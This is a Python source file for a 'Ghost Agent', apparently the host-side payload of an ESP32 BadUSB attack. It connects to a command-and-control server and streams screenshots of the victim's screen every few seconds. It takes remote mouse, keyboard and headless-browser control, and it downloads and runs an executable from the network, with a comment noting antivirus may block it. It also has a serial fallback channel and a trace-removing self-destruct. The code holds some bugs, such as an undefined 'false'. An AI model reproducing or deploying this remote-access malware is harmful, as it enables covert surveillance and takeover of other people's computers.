import time
import base64
import sys
import threading
import io
import socketio
try:
    from PIL import ImageGrab
    import pyautogui
    import requests
except ImportError:
    print("Installing required packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow", "python-socketio", "requests", "websocket-client", "pyautogui", "pyserial"])
    from PIL import ImageGrab
    import pyautogui
    import requests
    import websocket
    import json
    import os
    import serial
    import serial.tools.list_ports
    from PIL import ImageGrab
    import pyautogui
    import requests
    import websocket
    import json
    import os
try:
    import serial
    import serial.tools.list_ports
except ImportError:
    pass
    
pyautogui.FAILSAFE = False

# Configuration
SERVER_URL = "https://esp32-badusb.onrender.com" # Updated Render URL
HEARTBEAT_INTERVAL = 1.0 # seconds
SCREENSHOT_INTERVAL = 2.0 # seconds
CDP_PORT = 9222
PINCHTAB_PORT = 4000
PINCHTAB_ACTIVE = False
ws_cdp = None
cdp_msg_id = 1

sio = socketio.Client()
current_mode = "B" # Default to safety mode
running = True

def print_log(msg):
    print(f"[AGENT] {msg}")

def download_and_start_pinchtab():
    global PINCHTAB_ACTIVE
    try:
        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
        exe_path = os.path.join(temp_dir, 'pinchtab.exe')
        
        print_log("Downloading PinchTab...")
        res = requests.get('https://pinchtab.com/download/windows/pinchtab.exe')
        with open(exe_path, 'wb') as f:
            f.write(res.content)
            
        print_log("Starting PinchTab server...")
        subprocess.Popen([exe_path, "server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        # Test if it's running
        requests.get(f"http://127.0.0.1:{PINCHTAB_PORT}", timeout=2)
        PINCHTAB_ACTIVE = True
        print_log("PinchTab is active!")
    except Exception as e:
        print_log(f"PinchTab failed (likely blocked by AV). Falling back to Python CDP. Error: {e}")
        PINCHTAB_ACTIVE = False

def get_chrome_path():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def start_cdp_chrome():
    global ws_cdp
    try:
        chrome_path = get_chrome_path()
        if not chrome_path:
            print_log("Chrome/Edge not found.")
            return

        print_log("Starting headless Chrome with CDP...")
        subprocess.Popen([chrome_path, "--headless", f"--remote-debugging-port={CDP_PORT}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2) # wait for startup

        # Get WebSocket URL
        res = requests.get(f"http://127.0.0.1:{CDP_PORT}/json")
        pages = res.json()
        if pages:
            ws_url = pages[0].get("webSocketDebuggerUrl")
            ws_cdp = websocket.WebSocket()
            ws_cdp.connect(ws_url)
            print_log("Connected to Chrome via CDP!")
    except Exception as e:
        print_log(f"CDP Start failed: {e}")

def send_cdp_command(method, params=None):
    global cdp_msg_id, ws_cdp
    if not ws_cdp: return
    if params is None: params = {}
    msg = {"id": cdp_msg_id, "method": method, "params": params}
    ws_cdp.send(json.dumps(msg))
    cdp_msg_id += 1

def initialize_browser_control():
    download_and_start_pinchtab()
    if not PINCHTAB_ACTIVE:
        start_cdp_chrome()

@sio.event
def connect():
    print_log("Connected to C2 Server!")
    sio.emit('identify', 'agent')

@sio.event
def set_mode(mode):
    global current_mode
    current_mode = mode
    print_log(f"Mode switched to: {current_mode}")

@sio.event
def execute_command(cmd):
    print_log(f"Received Command from C2: {cmd}")
    if cmd.lower() == "test":
        print_log("Executing test command...")
    elif cmd.lower() == "kill":
        print_log("Kill command received. Self-destructing.")
        self_destruct()

@sio.event
def execute_json_command(data):
    print_log(f"Received JSON Command: {data}")
    try:
        action = data.get("action")
        
        # HYBRID BROWSER INTEGRATION
        if action.startswith("pinchtab_"):
            if PINCHTAB_ACTIVE:
                # Route to PinchTab API
                pt_action = action.replace("pinchtab_", "")
                requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/{pt_action}", json=data, timeout=5)
            else:
                # Route to Python CDP Fallback
                if action == "pinchtab_navigate":
                    send_cdp_command("Page.navigate", {"url": data.get("url")})
                elif action == "pinchtab_click":
                    selector = data.get("selector")
                    js = f"document.querySelector('{selector}').click();"
                    send_cdp_command("Runtime.evaluate", {"expression": js})
                elif action == "pinchtab_type":
                    selector = data.get("selector")
                    text = data.get("text")
                    js = f"document.querySelector('{selector}').value = '{text}';"
                    send_cdp_command("Runtime.evaluate", {"expression": js})
            return

        # FALLBACK PYAUTOGUI
        x = data.get("x")
        y = data.get("y")
        text = data.get("text")
        key = data.get("key")

        if action == "click" and x is not None and y is not None:
            pyautogui.click(x=int(x), y=int(y))
        elif action == "move" and x is not None and y is not None:
            pyautogui.moveTo(int(x), int(y))
        elif action == "type" and text:
            pyautogui.typewrite(text)
        elif action == "press" and key:
            pyautogui.press(key)
    except Exception as e:
        print_log(f"Failed to execute JSON command: {e}")

@sio.event
def disconnect():
    print_log("Disconnected from server.")

def check_internet():
    try:
        requests.get("https://1.1.1.1", timeout=2)
        return True
    except:
        return False

def find_esp_serial():
    ports = serial.tools.list_ports.comports()
    for port, desc, hwid in sorted(ports):
        if "USB" in hwid or "CH340" in desc or "CP210" in desc or "Serial" in desc:
            try:
                s = serial.Serial(port.device, 115200, timeout=1)
                return s
            except:
                pass
    return None

def send_screenshots():
    """Background thread to capture screen and send to server."""
    global running
    while running:
        internet_up = check_internet()
        if internet_up and not sio.connected:
            try:
                sio.connect(SERVER_URL)
            except:
                pass

        if sio.connected and internet_up:
            try:
                # Capture screen
                screenshot = ImageGrab.grab()
                
                # Compress image
                buffer = io.BytesIO()
                screenshot.thumbnail((1280, 720)) # Resize to save bandwidth
                screenshot.save(buffer, format="JPEG", quality=60)
                img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                
                # Send to server
                sio.emit('screenshot_data', img_str)
            except Exception as e:
                print_log(f"Screenshot error: {e}")
        elif not internet_up:
            # HYBRID FALLBACK
            esp_port = find_esp_serial()
            if esp_port:
                try:
                    # Check for pending commands from ESP32 first
                    if esp_port.in_waiting > 0:
                        line = esp_port.readline().decode('utf-8', errors='ignore').strip()
                        if line.startswith("CMD:"):
                            cmd_str = line[4:]
                            try:
                                if "{" in cmd_str and "}" in cmd_str:
                                    execute_json_command(json.loads(cmd_str))
                                else:
                                    execute_command(cmd_str)
                            except Exception as ex:
                                print_log(f"Hybrid CMD execution failed: {ex}")

                    # Capture and send tiny screenshot over serial
                    screenshot = ImageGrab.grab()
                    buffer = io.BytesIO()
                    screenshot.thumbnail((640, 360)) # Extra small for serial
                    screenshot.save(buffer, format="JPEG", quality=30)
                    img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                    
                    esp_port.write(b"IMG_START\n")
                    chunk_size = 64
                    for i in range(0, len(img_str), chunk_size):
                        esp_port.write(img_str[i:i+chunk_size].encode())
                    esp_port.write(b"\nIMG_END\n")
                except Exception as e:
                    print_log(f"Hybrid Serial Error: {e}")
                finally:
                    esp_port.close()
        
        time.sleep(SCREENSHOT_INTERVAL)

def check_heartbeat_usb():
    """Simulates checking if ESP32 USB is still plugged in."""
    # In reality, this would check if a specific COM port exists or ping a local IP
    # For demonstration, we assume it's always "plugged in" unless simulated otherwise.
    return True

def self_destruct():
    """Kills the agent and removes traces."""
    global running
    print_log("Initiating Self-Destruct Sequence...")
    running = false
    sio.disconnect()
    sys.exit(0)
    # In real BadUSB, you would also delete os.path.abspath(__file__)

def main_loop():
    global running
    print_log("Ghost Agent Started.")
    
    initialize_browser_control()
    
    # Start screenshot thread
    threading.Thread(target=send_screenshots, daemon=True).start()
    
    while running:
        try:
            # 1. Check USB Heartbeat
            usb_present = check_heartbeat_usb()
            
            if not usb_present and current_mode == 'B':
                print_log("CRITICAL: ESP32 Unplugged while in Mode B. Self destructing!")
                self_destruct()
                
            # 2. Send network heartbeat to C2 server
            if sio.connected:
                sio.emit('heartbeat')
                
            time.sleep(HEARTBEAT_INTERVAL)
            
        except KeyboardInterrupt:
            running = False
            break

if __name__ == '__main__':
    try:
        sio.connect(SERVER_URL)
        main_loop()
    except Exception as e:
        print_log(f"Connection failed: {e}")
